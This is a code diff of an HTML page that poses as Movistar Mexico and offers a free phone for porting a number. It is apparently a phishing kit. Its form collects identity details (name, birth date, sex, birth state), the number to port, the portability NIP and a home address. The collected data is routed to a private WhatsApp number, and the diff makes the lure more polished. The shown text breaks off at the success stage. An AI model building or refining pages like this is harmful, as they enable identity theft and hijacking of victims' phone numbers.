@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Movistar | Estatus Preferencial y Portabilidad</title>
+    <title>Movistar | Programa de Equipos Bonificados 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
@@ -14,419 +14,485 @@
         .bg-movistar-green { background-color: #5BC500; }
         .hero-gradient { background: linear-gradient(135deg, #019DF0 0%, #005A87 100%); }
         
-        .fade-in { animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        /* Animaciones de transición entre etapas */
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         
         .product-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        .product-card:hover { transform: translateY(-10px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); }
+        .product-card:hover { transform: translateY(-10px); box-shadow: 0 25px 30px -10px rgba(0, 0, 0, 0.1); }
 
-        .promo-card input:checked + div {
-            border-color: #019DF0;
-            background-color: #f0f9ff;
-            box-shadow: 0 10px 15px -3px rgba(1, 157, 240, 0.2);
-        }
+        .step-indicator.active { background-color: #019DF0; color: white; transform: scale(1.1); box-shadow: 0 0 20px rgba(1, 157, 240, 0.3); }
+        .step-indicator.completed { background-color: #5BC500; color: white; }
 
-        .step-bubble { position: relative; }
-        .step-bubble::after { content: ''; position: absolute; left: 50%; bottom: -20px; width: 2px; height: 20px; background: #e2e8f0; display: block; }
-        .step-bubble:last-child::after { display: none; }
+        /* Control de Visibilidad de Secciones */
+        .stage-container { display: none; }
+        .stage-container.active { display: block; }
 
-        @media (min-width: 768px) {
-            .step-bubble::after { left: 100%; top: 50%; bottom: auto; width: 40px; height: 2px; transform: translateY(-50%); }
-        }
+        .countdown-box { background: white; border-radius: 1.5rem; padding: 1.5rem; text-align: center; box-shadow: inset 0 2px 4px rgba(0,0,0,0.05); border: 1px solid #f1f5f9; }
+        .countdown-val { font-size: 2rem; font-weight: 900; color: #019DF0; display: block; line-height: 1; }
+        .countdown-label { font-size: 0.65rem; text-transform: uppercase; color: #64748b; font-weight: 800; margin-top: 0.5rem; display: block; }
     </style>
 </head>
 <body class="bg-slate-50 text-slate-900">
 
-    <!-- Loader de Entrada -->
+    <!-- Loader Inicial -->
     <div id="loader" class="fixed inset-0 bg-white z-[9999] flex flex-col justify-center items-center">
         <div class="animate-spin h-14 w-14 text-movistar-blue mb-4">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><circle class="opacity-25" cx="12" cy="12" r="10"></circle><path class="opacity-75" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4"></path></svg>
         </div>
-        <p class="text-movistar-blue font-black italic animate-pulse tracking-widest uppercase text-sm">SISTEMA MOVISTAR MÉXICO</p>
+        <p class="text-movistar-blue font-black italic animate-pulse tracking-widest uppercase text-xs">SISTEMA MOVISTAR MÉXICO</p>
     </div>
 
-    <!-- Header Fijo -->
-    <header class="movistar-blue text-white shadow-lg sticky top-0 z-40">
+    <!-- Barra de Navegación Fija -->
+    <header class="movistar-blue text-white shadow-xl sticky top-0 z-50">
         <div class="container mx-auto px-4 h-16 flex items-center justify-between">
             <div class="flex items-center gap-2 cursor-pointer" onclick="location.reload()">
-                <div class="bg-white p-1 rounded-full"><i class="fas fa-phone-alt text-movistar-blue text-xs"></i></div>
+                <div class="bg-white p-1.5 rounded-full shadow-inner"><i class="fas fa-phone-alt text-movistar-blue text-xs"></i></div>
                 <span class="font-black text-xl tracking-tighter uppercase italic">Movistar</span>
             </div>
-            <div class="flex items-center gap-6">
-                <a href="https://wa.me/523334066972" class="hidden sm:flex items-center gap-2 text-[10px] font-black uppercase bg-white/10 px-3 py-1 rounded-full hover:bg-white/20 transition-all">
-                    <i class="fas fa-headset text-movistar-green"></i> Soporte Técnico
+            <div class="flex items-center gap-4">
+                <a href="https://wa.me/523334066972" target="_blank" class="hidden sm:flex items-center gap-2 text-[10px] font-black uppercase bg-white/10 px-4 py-2 rounded-full hover:bg-white/20 transition-all">
+                    <i class="fas fa-headset text-movistar-green"></i> Soporte México
                 </a>
-                <div class="bg-movistar-green px-3 py-1 rounded-full text-[10px] font-black shadow-inner uppercase">VIP 2026</div>
             </div>
         </div>
     </header>
 
-    <!-- VISTA 0: VALIDACIÓN DE ESTATUS -->
-    <div id="view-validator" class="fade-in flex items-center justify-center min-h-[80vh] px-4">
-        <div class="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl max-w-xl w-full border border-slate-100 text-center">
-            <div class="w-20 h-20 bg-blue-50 text-movistar-blue rounded-full flex items-center justify-center mx-auto mb-6">
-                <i class="fas fa-user-check text-3xl"></i>
+    <!-- Indicador de Etapas (Stepper) -->
+    <nav id="global-stepper" class="bg-white border-b sticky top-16 z-40 py-6 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center justify-between max-w-2xl mx-auto relative">
+                <div class="absolute top-1/2 left-0 w-full h-0.5 bg-slate-100 -translate-y-1/2 z-0"></div>
+                
+                <div class="relative z-10 flex flex-col items-center gap-2">
+                    <div id="dot-1" class="step-indicator active w-10 h-10 rounded-full border-2 border-slate-100 bg-white flex items-center justify-center text-sm font-black transition-all">1</div>
+                    <span class="text-[10px] font-black uppercase text-slate-400">Validar</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center gap-2">
+                    <div id="dot-2" class="step-indicator w-10 h-10 rounded-full border-2 border-slate-100 bg-white flex items-center justify-center text-sm font-black transition-all">2</div>
+                    <span class="text-[10px] font-black uppercase text-slate-400">Equipos</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center gap-2">
+                    <div id="dot-3" class="step-indicator w-10 h-10 rounded-full border-2 border-slate-100 bg-white flex items-center justify-center text-sm font-black transition-all">3</div>
+                    <span class="text-[10px] font-black uppercase text-slate-400">Solicitud</span>
+                </div>
             </div>
-            <h2 class="text-3xl font-black text-slate-800 italic uppercase tracking-tighter mb-4">Validar Estatus Preferencial</h2>
-            <p class="text-slate-500 mb-8 font-medium">Ingresa tu número de teléfono actual para verificar si eres elegible para el equipo de regalo por portabilidad.</p>
+        </div>
+    </nav>
+
+    <!-- ETAPA 1: SECCIÓN DE VALIDACIÓN -->
+    <section id="stage-1" class="stage-container active fade-in py-16 px-4">
+        <div class="max-w-xl mx-auto bg-white p-10 md:p-14 rounded-[4rem] shadow-2xl border border-slate-50 text-center relative overflow-hidden">
+            <div class="bg-blue-50 w-24 h-24 rounded-[2rem] rotate-12 flex items-center justify-center mx-auto mb-8">
+                <i class="fas fa-user-shield text-4xl text-movistar-blue -rotate-12"></i>
+            </div>
+            <h2 class="text-3xl font-black text-slate-800 italic uppercase tracking-tighter mb-4">Verificar Beneficio</h2>
+            <p class="text-slate-500 font-medium text-sm leading-relaxed mb-10">
+                Consulta si tu número actual es elegible para recibir un <span class="text-movistar-blue font-black underline">equipo de gama alta sin costo</span> al realizar tu portabilidad.
+            </p>
             
-            <div class="space-y-4">
+            <div class="space-y-4 max-w-sm mx-auto">
                 <input type="tel" id="val-phone" maxlength="10" placeholder="Número a 10 dígitos" 
-                    class="w-full bg-slate-50 border-2 border-slate-100 p-5 rounded-2xl text-center text-2xl font-black tracking-[0.3em] focus:border-movistar-blue outline-none transition-all">
-                <button onclick="startValidation()" class="w-full movistar-blue text-white font-black py-5 rounded-2xl shadow-xl hover:scale-[1.02] transition-all flex items-center justify-center gap-3 italic">
-                    CONSULTAR BENEFICIOS <i class="fas fa-arrow-right"></i>
+                    class="w-full bg-slate-50 border-2 border-slate-100 p-6 rounded-3xl text-center text-3xl font-black tracking-[0.2em] focus:border-movistar-blue outline-none transition-all focus:bg-white shadow-inner">
+                <button onclick="processValidation()" id="val-btn" class="w-full movistar-blue text-white font-black py-6 rounded-3xl shadow-xl hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-3 italic uppercase text-sm">
+                    CONTINUAR <i class="fas fa-arrow-right"></i>
                 </button>
             </div>
             
-            <div id="val-loading" class="hidden mt-6 text-center">
-                <div class="inline-block animate-spin rounded-full h-8 w-8 border-4 border-movistar-blue border-t-transparent mb-2"></div>
-                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Conectando con base de datos...</p>
+            <div id="val-loader-box" class="hidden mt-10 space-y-4">
+                <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
+                    <div id="val-progress" class="h-full movistar-blue w-0 transition-all duration-300"></div>
+                </div>
+                <p id="val-text" class="text-[10px] font-black text-movistar-blue uppercase tracking-widest animate-pulse">Iniciando protocolo de consulta...</p>
             </div>
         </div>
-    </div>
+    </section>
 
-    <!-- VISTA 1: CATÁLOGO (Oculto inicialmente) -->
-    <div id="view-catalog" class="hidden fade-in">
-        <section class="hero-gradient text-white py-12 px-4 text-center">
+    <!-- ETAPA 2: SECCIÓN DE CATÁLOGO -->
+    <section id="stage-2" class="stage-container fade-in">
+        <div class="hero-gradient text-white py-16 px-4 text-center">
             <div class="max-w-4xl mx-auto">
-                <div class="inline-block bg-white/20 backdrop-blur-sm px-4 py-1 rounded-full text-[10px] font-black uppercase mb-4 border border-white/20">Estatus: Elegibilidad Confirmada</div>
-                <h1 class="text-4xl md:text-6xl font-black mb-4 italic tracking-tighter leading-tight">¡FELICIDADES! ELIGE TU EQUIPO</h1>
-                <p class="text-lg opacity-90 font-light mb-8 max-w-2xl mx-auto">
-                    Por realizar tu portabilidad a Movistar, el equipo que selecciones es <span class="font-black underline decoration-movistar-green underline-offset-4">COMPLETAMENTE GRATIS</span>.
+                <div class="inline-flex items-center gap-3 bg-white/20 backdrop-blur-md px-6 py-2.5 rounded-full text-[10px] font-black uppercase mb-6 border border-white/20">
+                    <i class="fas fa-certificate text-movistar-green"></i> Estatus: Usuario Seleccionado para Bonificación
+                </div>
+                <h2 class="text-4xl md:text-6xl font-black mb-4 italic tracking-tighter leading-tight uppercase">Elige tu Equipo de Regalo</h2>
+                <p class="text-lg opacity-90 font-light mb-10 max-w-2xl mx-auto italic">
+                    Selecciona el dispositivo que deseas recibir. Costo inicial: <span class="font-black text-movistar-green">$0.00 MXN</span>.
                 </p>
-                
-                <div class="flex flex-col md:flex-row items-center justify-center gap-4">
-                    <div class="relative">
-                        <i class="fas fa-search absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"></i>
-                        <input type="text" id="searchInput" onkeyup="filterProducts()" placeholder="Buscar equipo..." 
-                        class="bg-white text-slate-800 pl-12 pr-6 py-3 rounded-2xl outline-none w-72 md:w-80 focus:ring-4 focus:ring-movistar-green/30 transition-all">
-                    </div>
+                <div class="relative max-w-md mx-auto">
+                    <i class="fas fa-search absolute left-5 top-1/2 -translate-y-1/2 text-slate-400"></i>
+                    <input type="text" id="searchInput" onkeyup="filterDevices()" placeholder="Buscar equipo..." 
+                    class="w-full bg-white text-slate-800 pl-14 pr-6 py-5 rounded-3xl outline-none focus:ring-4 focus:ring-movistar-green/30 transition-all shadow-2xl font-bold">
                 </div>
             </div>
-        </section>
+        </div>
 
-        <!-- Sección de Proceso -->
-        <section class="bg-white py-12 border-b">
-            <div class="container mx-auto px-4">
-                <h3 class="text-center text-xs font-black text-slate-400 uppercase tracking-[0.3em] mb-10">Proceso de entrega y activación</h3>
-                <div class="grid grid-cols-1 md:grid-cols-5 gap-8">
-                    <div class="step-bubble text-center">
-                        <div class="w-12 h-12 bg-movistar-blue text-white rounded-full flex items-center justify-center mx-auto mb-4 font-black">1</div>
-                        <p class="text-[10px] font-black uppercase text-slate-800">Solicita<br>Portabilidad</p>
-                    </div>
-                    <div class="step-bubble text-center">
-                        <div class="w-12 h-12 bg-movistar-blue text-white rounded-full flex items-center justify-center mx-auto mb-4 font-black">2</div>
-                        <p class="text-[10px] font-black uppercase text-slate-800">Recibe tu<br>Chip (SIM)</p>
-                    </div>
-                    <div class="step-bubble text-center">
-                        <div class="w-12 h-12 bg-movistar-green text-white rounded-full flex items-center justify-center mx-auto mb-4 font-black">3</div>
-                        <p class="text-[10px] font-black uppercase text-slate-800">Recarga<br>$100 Pesos</p>
-                    </div>
-                    <div class="step-bubble text-center">
-                        <div class="w-12 h-12 bg-movistar-blue text-white rounded-full flex items-center justify-center mx-auto mb-4 font-black">4</div>
-                        <p class="text-[10px] font-black uppercase text-slate-800">Registro en<br>Portal Web</p>
-                    </div>
-                    <div class="step-bubble text-center">
-                        <div class="w-12 h-12 bg-slate-900 text-white rounded-full flex items-center justify-center mx-auto mb-4 font-black"><i class="fas fa-truck-fast"></i></div>
-                        <p class="text-[10px] font-black uppercase text-slate-800">Entrega en<br>48 Horas</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <main class="container mx-auto px-4 py-12">
-            <div id="products-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
-                <!-- Se inyecta vía JS -->
+        <main class="container mx-auto px-4 py-16">
+            <div id="device-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-10">
+                <!-- Generado por JS -->
             </div>
         </main>
-    </div>
+    </section>
 
-    <!-- VISTA 2: FORMULARIO (CHECKOUT) -->
-    <div id="view-checkout" class="hidden fade-in py-12 min-h-screen bg-slate-100">
-        <div class="container mx-auto px-4 max-w-4xl">
-            <button onclick="backToCatalog()" class="mb-8 text-movistar-blue font-black flex items-center gap-2 hover:gap-4 transition-all uppercase text-sm">
-                <i class="fas fa-arrow-left"></i> Cambiar de equipo
+    <!-- ETAPA 3: SECCIÓN DE REGISTRO (CURP + NIP) -->
+    <section id="stage-3" class="stage-container fade-in py-16 bg-slate-100 min-h-screen">
+        <div class="container mx-auto px-4 max-w-5xl">
+            <button onclick="backToCatalog()" class="mb-8 text-movistar-blue font-black flex items-center gap-2 hover:gap-4 transition-all uppercase text-sm italic">
+                <i class="fas fa-chevron-left"></i> Cambiar de equipo
             </button>
 
-            <div class="bg-white shadow-2xl rounded-[3rem] overflow-hidden border border-slate-200">
-                <!-- Header del Form -->
-                <div class="movistar-blue p-8 text-white flex flex-col md:flex-row items-center gap-6">
-                    <div id="selected-img-container" class="w-32 h-32 bg-white rounded-3xl p-3 shadow-2xl flex items-center justify-center">
-                        <img id="checkout-img" src="" class="max-h-full object-contain" alt="Equipo">
+            <div class="bg-white shadow-2xl rounded-[4rem] overflow-hidden border border-slate-200">
+                <div class="movistar-blue p-10 md:p-14 text-white flex flex-col md:flex-row items-center gap-10">
+                    <div class="w-44 h-44 bg-white rounded-[3rem] p-5 shadow-2xl flex items-center justify-center flex-shrink-0">
+                        <img id="checkout-img" src="" class="max-h-full object-contain" alt="Seleccionado">
                     </div>
-                    <div>
-                        <span class="text-xs font-black uppercase tracking-widest opacity-80">Equipo de Regalo Seleccionado</span>
-                        <h2 id="checkout-name" class="text-3xl font-black italic tracking-tighter uppercase leading-none">NOMBRE DEL EQUIPO</h2>
-                        <div class="flex flex-wrap gap-2 mt-3">
-                            <span class="bg-movistar-green text-white text-[10px] font-black px-3 py-1 rounded-full uppercase italic animate-pulse">Costo: $0.00 pesos</span>
-                            <span class="bg-white/20 text-white text-[10px] font-black px-3 py-1 rounded-full uppercase italic">Envío Prioritario</span>
+                    <div class="text-center md:text-left">
+                        <span class="text-[10px] font-black uppercase tracking-widest opacity-80 italic bg-white/10 px-4 py-1.5 rounded-full">Solicitud de Portabilidad</span>
+                        <h2 id="checkout-name" class="text-4xl md:text-5xl font-black italic tracking-tighter uppercase leading-none mt-4">CARGANDO...</h2>
+                        <div class="flex justify-center md:justify-start gap-3 mt-6">
+                            <span class="bg-movistar-green text-white text-xs font-black px-5 py-2 rounded-full uppercase italic">Regalo Bonificado 100%</span>
                         </div>
                     </div>
                 </div>
 
-                <!-- Bloque de Instrucciones NIP -->
-                <div class="p-8 bg-amber-50 border-b border-amber-100 flex gap-4">
-                    <div class="bg-amber-400 text-white w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0">
-                        <i class="fas fa-key"></i>
-                    </div>
-                    <div>
-                        <h4 class="text-xs font-black text-amber-900 uppercase mb-1">¿Cómo obtener mi NIP de Portabilidad?</h4>
-                        <p class="text-[11px] text-amber-800 leading-relaxed">
-                            Es indispensable para conservar tu número. Puedes obtenerlo de dos formas: <br>
-                            1. Marca al <span class="font-bold">051</span> desde la línea que deseas traer a Movistar. <br>
-                            2. Envía un mensaje SMS con la palabra <span class="font-bold uppercase">NIP</span> al número <span class="font-bold">051</span>.
-                        </p>
-                    </div>
-                </div>
-
-                <form id="main-capture-form" onsubmit="handleFinalSubmit(event)" class="p-8 md:p-12 space-y-12">
-                    
-                    <!-- PASO 1: Datos Personales -->
-                    <div class="space-y-6">
-                        <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-movistar-blue pl-3">1. Datos del Titular</h3>
-                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Nombre(s)</label>
-                                <input type="text" id="cust-name" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all uppercase font-bold">
-                            </div>
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Apellido Paterno</label>
-                                <input type="text" id="cust-paterno" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all uppercase font-bold">
-                            </div>
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Apellido Materno</label>
-                                <input type="text" id="cust-materno" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all uppercase font-bold">
-                            </div>
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Fecha Nacimiento</label>
-                                <input type="date" id="cust-dob" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all">
-                            </div>
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Género</label>
-                                <select id="cust-sex" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all font-bold">
-                                    <option value="">Selecciona...</option>
-                                    <option value="H">HOMBRE</option>
-                                    <option value="M">MUJER</option>
-                                </select>
-                            </div>
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Estado Nacimiento</label>
-                                <select id="cust-state" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all font-bold">
-                                    <option value="">Estado...</option>
-                                    <option value="AS">AGUASCALIENTES</option><option value="BC">BAJA CALIFORNIA</option><option value="BS">BAJA CALIFORNIA SUR</option><option value="CC">CAMPECHE</option><option value="CS">CHIAPAS</option><option value="CH">CHIHUAHUA</option><option value="DF">CIUDAD DE MÉXICO</option><option value="CL">COAHUILA</option><option value="CM">COLIMA</option><option value="DG">DURANGO</option><option value="GT">GUANAJUATO</option><option value="GR">GUERRERO</option><option value="HG">HIDALGO</option><option value="JC">JALISCO</option><option value="MC">MÉXICO</option><option value="MN">MICHOACÁN</option><option value="MS">MORELOS</option><option value="NT">NAYARIT</option><option value="NL">NUEVO LEÓN</option><option value="OC">OAXACA</option><option value="PL">PUEBLA</option><option value="QT">QUERÉTARO</option><option value="QR">QUINTANA ROO</option><option value="SP">SAN LUIS POTOSÍ</option><option value="SL">SINALOA</option><option value="SR">SONORA</option><option value="TC">TABASCO</option><option value="TS">TAMAULIPAS</option><option value="TL">TLAXCALA</option><option value="VZ">VERACRUZ</option><option value="YN">YUCATÁN</option><option value="ZS">ZACATECAS</option>
-                                </select>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- PASO 2: Línea -->
-                    <div class="space-y-6">
-                        <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-movistar-green pl-3">2. Línea y Recarga Inicial</h3>
+                <div class="p-10 md:p-14">
+                    <form id="portability-form" onsubmit="submitPortability(event)" class="space-y-10">
                         
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-6">
-                            <label class="promo-card cursor-pointer">
-                                <input type="radio" name="promo" value="$100 x 45 días" checked class="hidden">
-                                <div class="p-6 rounded-[2rem] border-2 border-slate-100 transition-all text-center">
-                                    <p class="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1">OBLIGATORIO PARA REGALO</p>
-                                    <h4 class="text-4xl font-black text-movistar-green italic">$100</h4>
-                                    <p class="font-bold text-slate-700">Recarga para Activación de Portabilidad</p>
-                                    <p class="text-[9px] text-slate-400 mt-1">Vigencia: 45 Días Ilimitados</p>
+                        <!-- SECCIÓN: IDENTIDAD (DATOS CURP) -->
+                        <div class="space-y-6">
+                            <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-movistar-blue pl-4">1. Identidad del Titular</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Nombre(s)</label>
+                                    <input type="text" id="c-name" required placeholder="Nombres" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
                                 </div>
-                            </label>
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Ap. Paterno</label>
+                                    <input type="text" id="c-paterno" required placeholder="Apellido" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Ap. Materno</label>
+                                    <input type="text" id="c-materno" required placeholder="Apellido" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
+                                </div>
+                            </div>
+                            
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Fecha Nacimiento</label>
+                                    <input type="date" id="c-dob" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Género</label>
+                                    <select id="c-sex" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold shadow-sm">
+                                        <option value="">Género...</option>
+                                        <option value="H">HOMBRE</option>
+                                        <option value="M">MUJER</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Edo. Nacimiento</label>
+                                    <select id="c-state" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold shadow-sm">
+                                        <option value="">Estado...</option>
+                                        <option value="AS">AGUASCALIENTES</option><option value="BC">BAJA CALIFORNIA</option><option value="BS">BAJA CALIFORNIA SUR</option><option value="CC">CAMPECHE</option><option value="CS">CHIAPAS</option><option value="CH">CHIHUAHUA</option><option value="DF">CIUDAD DE MÉXICO</option><option value="CL">COAHUILA</option><option value="CM">COLIMA</option><option value="DG">DURANGO</option><option value="GT">GUANAJUATO</option><option value="GR">GUERRERO</option><option value="HG">HIDALGO</option><option value="JC">JALISCO</option><option value="MC">MÉXICO</option><option value="MN">MICHOACÁN</option><option value="MS">MORELOS</option><option value="NT">NAYARIT</option><option value="NL">NUEVO LEÓN</option><option value="OC">OAXACA</option><option value="PL">PUEBLA</option><option value="QT">QUERÉTARO</option><option value="QR">QUINTANA ROO</option><option value="SP">SAN LUIS POTOSÍ</option><option value="SL">SINALOA</option><option value="SR">SONORA</option><option value="TC">TABASCO</option><option value="TS">TAMAULIPAS</option><option value="TL">TLAXCALA</option><option value="VZ">VERACRUZ</option><option value="YN">YUCATÁN</option><option value="ZS">ZACATECAS</option>
+                                    </select>
+                                </div>
+                            </div>
                         </div>
 
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Número a Portar (10 Dígitos)</label>
-                                <input type="tel" id="port-num" required maxlength="10" placeholder="55XXXXXXXX" class="w-full bg-slate-50 p-4 rounded-2xl border-2 border-slate-100 focus:border-movistar-blue outline-none transition-all font-black text-lg">
-                            </div>
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">NIP de Portabilidad (4 Dígitos)</label>
-                                <input type="tel" id="port-nip" required maxlength="4" placeholder="####" class="w-full bg-slate-50 p-4 rounded-2xl border-2 border-slate-100 focus:border-movistar-blue outline-none transition-all font-black text-lg">
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- PASO 3: Dirección -->
-                    <div class="space-y-6">
-                        <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-slate-800 pl-3">3. Dirección de Envío</h3>
-                        <div class="grid grid-cols-1 gap-6">
-                            <div>
-                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-1 ml-2">Dirección Completa</label>
-                                <textarea id="cust-address" required placeholder="Calle, Número, Colonia, CP, Referencias del domicilio para entrega express..." rows="3" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none transition-all shadow-sm font-medium"></textarea>
+                        <!-- SECCIÓN: LÍNEA Y NIP -->
+                        <div class="space-y-6">
+                            <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-movistar-green pl-4">2. Línea de Origen</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Número a Portar (10 Dígitos)</label>
+                                    <input type="tel" id="p-num" required maxlength="10" placeholder="55" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-5 rounded-3xl outline-none font-black text-2xl transition-all shadow-sm">
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">NIP de Portabilidad (051)</label>
+                                    <input type="tel" id="p-nip" required maxlength="4" placeholder="####" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-5 rounded-3xl outline-none font-black text-2xl transition-all shadow-sm">
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-                    <!-- Disclaimer -->
-                    <div class="bg-slate-100 p-6 rounded-[2rem] border border-slate-200">
-                        <p class="text-[10px] text-slate-600 leading-relaxed font-medium">
-                            <i class="fas fa-info-circle mr-1"></i> Una vez enviada la solicitud, deberás acudir a una sucursal por tu chip o esperar la visita del técnico, realizar tu recarga de $100 y registrarte en el portal. Tu equipo llegará en un plazo máximo de 48 horas tras completar estos pasos.
-                        </p>
-                    </div>
+                        <!-- SECCIÓN: LOGÍSTICA -->
+                        <div class="space-y-6">
+                            <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-slate-800 pl-4">3. Logística de Entrega</h3>
+                            <div>
+                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Dirección Completa de Despacho</label>
+                                <textarea id="p-address" required placeholder="Calle, # ext e int, Colonia, CP, Municipio y Referencias..." rows="3" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-6 rounded-[2rem] outline-none font-medium transition-all shadow-sm"></textarea>
+                            </div>
+                        </div>
 
-                    <button type="submit" id="submitBtn" class="w-full movistar-blue hover:bg-sky-600 text-white font-black py-6 rounded-[2rem] shadow-2xl transition-all flex items-center justify-center gap-4 text-xl italic uppercase tracking-tighter">
-                        ENVIAR SOLICITUD POR WHATSAPP <i class="fab fa-whatsapp text-2xl"></i>
-                    </button>
-                </form>
+                        <button type="submit" id="submit-btn" class="w-full movistar-blue hover:bg-sky-600 text-white font-black py-7 rounded-[2.5rem] shadow-2xl transition-all flex items-center justify-center gap-5 uppercase italic text-xl group">
+                            SOLICITAR EQUIPO Y PORTABILIDAD <i class="fab fa-whatsapp text-3xl group-hover:scale-110"></i>
+                        </button>
+                    </form>
+                </div>
             </div>
         </div>
-    </div>
+    </section>
 
-    <!-- Floating Support -->
-    <a href="https://wa.me/523334066972" class="fixed bottom-6 right-6 bg-slate-900 text-white p-4 rounded-full shadow-2xl hover:scale-110 transition-all z-50 flex items-center gap-3">
-        <i class="fas fa-headset text-xl"></i>
-        <span class="text-[10px] font-black uppercase pr-2 hidden md:block">Soporte Técnico</span>
-    </a>
+    <!-- ETAPA 4: SECCIÓN DE ÉXITO -->
+    <section id="stage-4" class="stage-container fade-in py-16 px-4">
+        <div class="max-w-3xl mx-auto bg-white p-12 md:p-20 rounded-[5rem] shadow-2xl border border-slate-50 text-center relative">
+            <div class="w-28 h-28 bg-movistar-green text-white rounded-full flex items-center justify-center mx-auto mb-10 shadow-2xl shadow-green-200">
